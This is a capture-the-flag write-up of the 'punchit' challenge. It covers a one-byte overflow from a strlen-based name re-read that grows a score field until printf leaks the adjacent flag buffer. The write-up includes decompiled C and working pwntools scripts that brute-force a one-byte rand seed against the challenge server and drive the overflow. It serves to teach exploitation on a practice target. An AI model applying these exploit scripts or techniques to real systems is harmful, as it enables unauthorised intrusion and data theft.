# punchit
## slopey | 1/4/2020

TL;DR: 1 byte overflow into score, set score to -1 to overflow into flag and print name

## Background

We are given a number guessing game.

```
[slopey@mariner PunchIt]$ ./punchit

	Let's play a punching game? [Y/n] : y
Name: frog
Select your character:
	1. Goku
	2. Saitama
	3. Naruto
	4. Toriko
> 1
Loading.....
score: 0
gimmi pawa> 123
Sowwy, pleya frog
 luse, bay bay
```

Let's check the securities:

```
[slopey@mariner PunchIt]$ checksec punchit
[*] '/home/slopey/Documents/ctf/pwn/PunchIt/punchit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we have full protections on everything.

## Reversing

First, information about the game is stored in a struct titled `game_t`. It looks like this:

| Type      | Variable | Size
|-----------|----------|------
| int       | seed     | 8
| char[44]  | name     | 44
| uint      | score    | 4
| int       | padding  | 4
| char[128] | flag     | 128

### motd_select_character

```c
void motd_select_character(void)
{
  int iVar1;
  int local_14;
  
  printf("\n\tLet\'s play a punching game? [Y/n] : ");
  iVar1 = getchar();
  if (iVar1 == 0x6e) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  getchar();
  printf("Name: ");
  read(0,game_t.name,0x2c);
  printf("Select your character: \n\t1. Goku\n\t2. Saitama\n\t3. Naruto\n\t4. Toriko\n> ");
  iVar1 = getchar();
  if (iVar1 == 0x32) {
    choose_saitama();
    goto LAB_00100e06;
  }
  if (iVar1 < 0x33) {
    if (iVar1 == 0x31) {
      choose_goku();
      goto LAB_00100e06;
    }
  }
  else {
    if (iVar1 == 0x33) {
      choose_naruto();
      goto LAB_00100e06;
    }
    if (iVar1 == 0x34) {
      choose_toriko();
      goto LAB_00100e06;
    }
  }
  puts("Invalid");
LAB_00100e06:
  srand(game_t.seed);
  printf("Loading");
  local_14 = 0;
  while (local_14 < 5) {
    putchar(0x2e);
    sleep(0);
    local_14 = local_14 + 1;
  }
  putchar(10);
  iVar1 = open("./flag",0);
  if (iVar1 != -1) {
    read(iVar1,game_t.flag,0x80);
    close(iVar1);
    return;
  }
  puts("error");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
Some important things to point out: 
- The game is seeded with a random n byte integer from /dev/urandom depending on what character you choose. We will want to pick Saitama in the future because choosing Saitama only reads in one byte from /dev/urandom, so it is realistic to brute force.
- The flag is on a buffer very close to name. All the reads here are safe, but the only bytes between the name and the flag is the score
- There is a 5 second sleep. This kind of threw me off, but apparently it's just to ease the load on the server or something.

### main
```c

undefined8 main(void)

{
  int iVar1;
  size_t __nbytes;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  motd_select_character();
  do {
    while( true ) {
      while( true ) {
        printf("score: %ld\n",game_t._48_8_);
        printf("gimmi pawa> ");
        local_18 = 0;
        local_14 = rand();
        __isoc99_scanf("%u",&local_18);
        getchar();
        if (local_18 != local_14) break;
        puts("draw");
        printf("Save? [N/y]");
        iVar1 = getchar();
        if (iVar1 == 0x79) {
          printf("Name: ");
          __nbytes = strlen(game_t.name);
          read(0,game_t.name,__nbytes);
        }
      }
      if (local_18 <= local_14) break;
      game_t._48_8_ = game_t._48_8_ + 1;
    }
  } while (local_14 <= local_18);
  printf("Sowwy, pleya %s luse, bay bay",0x302044);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
```

The ghidra disassembly is pretty trash here, so let me try to explain the logic for the game:

Every round, a random number is generated. If the player guesses a number lower than the random number, the game ends and the player's name is printed. If the player guesses a number larger than the random number, the score increments by one. If the player guesses the random number, they can change their name.

The vulnerability in this program is in the save name functionality. As you can see, it determines how many bytes to read into the name field by taking the strlen of the name instead of strnlen. This is problematic because if the score is non null, you get a one byte overflow since strlen will think the score is also part of the name, so you can overflow into the score field.

## Exploitation

Knowing this, we have a very simple plan for exploitation. The basic idea is that we want to set all 4 bytes of the score, plus another 4 bytes of padding, to a non-null amount. That way, when we lose the game and our name is printed, printf will search for a null-terminated string and search beyond the flag, printing out the name, score, and flag buffer.

However, simply incrementing our score to 0xffffffffffffffff is obviously not feasible. We would have to increment our score 18 quintillion times. So we need a more optimized solution.

Also, we need to know the seed. This is pretty trivial to overcome. Since choosing Saitama means our seed is only 1 byte, this is easily brute forceable. Since there is a 5 second sleep, theoretically it will only take us 20 minutes at most to guess the seed. This is my code for brute forcing the seed:

```py
libc = CDLL("libc.so.6")

def init(r):
    r.recvuntil(": ")
    r.sendline("y")
    r.recvuntil("Name: ")
    r.sendline("A" * 0x2b)
    r.recvuntil("> ")
    r.sendline("2")


def bf_seed():
    ct = 1
    while True:
        log.info("Attempt #{}...".format(ct))
        # r = process(exe.path)
        r = remote("svc.pwnable.xyz", 30024)
        # gdb.attach(r)
        libc.srand(0x81)
        init(r)
        r.recvuntil("> ")
        r.sendline(str(libc.rand()))
        res = r.recvline().strip().decode()
        if res == "draw":
            log.success("Seed found after {} attempts".format(ct))
            return r
        r.close()
        ct += 1
```

It only took me 67 attempts to guess the seed on remote. For debugging, I used a patched version of the executable without the 5 second sleeps.

## Towers of Hanoi

The first problem is not has trivial to solve, but it is actually very similar to the Towers of Hanoi game. I actually didn't realize this until I saw someone's solution after I solved the challenge. 

The key observation is that we can use the overflow to automatically write 0xff bytes to the score. For example, let's say our starting score is 0x1. strlen will return the length of the name buffer as being 45 instead of 44, so we get a 1 byte overflow into the starting score. So now, if we overflow 0xff into the starting score, we were able to instantly increase our score by 0xfe. Simply incrementing the score by two will set our new score to 0x101. Now, strlen will return the length of the name buffer as being 46, since the score has 2 digits. 

Breaking this down into subproblems, we can remodel this problem to something more like the Towers of Hanoi: Giving a n digit long number with only 0xfs, minimize the number of operations it takes to create a n + 1 digit long number with only 0xfs. The given operations are incrementing the number (moving one hoop from one tower to the next) or overflowing m digits (setting the lower m towers to their tallest height.)

The greedy algorithm I came up with to solve this problem repeats the following procedure for a i digit number:
1. Add 2
2. Overflow as many bytes as possible.
This procedure loops for the number until the score is equal to 16 ** (i * 2) - 1. I multiply by two since each byte is 2 digits. 

In my code, I define the add operation as "push" and the overflow operation as "over." First, I define a helper function to define the max number of bytes I can overflow:

```py
def get_full(num):
    ct = 0
    while num & 0xff:
        ct += 1
        num >>= 0x8
    return ct
```

The function determines how many contiguous, non-null bytes are in the num. I also have an API to interface with the remote:

```py
def game(r, push, over, score):
    for _ in range(push):
        r.recvuntil("> ")
        r.sendline(str(libc.rand() + 1))
        score += 1
    r.sendline(str(libc.rand()))
    r.recvuntil("[N/y]")
    r.sendline(b"y" + b"\xff" * (BASE + over))
    mask = 0xff
    for _ in range(over):
        score |= mask
        mask <<= 0x8
    return score
```

I simulate increasing the score in the API so I can keep track of the score. Finally, here is my code to solve the overflow problem:

```py
score = game(r, 1, 1, score)
log.info("Initiating greedy strategy...")
# Optimal solution is to add 2, then overwrite as many 
# bytes as possible, until we reach n * 2 digits of 0xf
for i in range(2, 9):
    log.info("Trying {} bytes...".format(i))
    while True:
        score = game(r, 2, get_full(score + 2), score)
        log.info(hex(score))
        if score == 16 ** (i * 2) - 1:
            break
    log.success("Score is now {} bytes long.".format(i))
log.success("Greedy strategy complete.")
```

For the first byte, the strategy is a little different since the initial score is 0x0, so we have to increment score by 1, and then overflow.

## Pwned!

The rest is simple. We simply lose the game, and then the flag is printed along with the name and score.

```py
r.recvuntil("> ")
r.sendline("0")

r.interactive()
```

My full code is in [solve.py](solve.py)
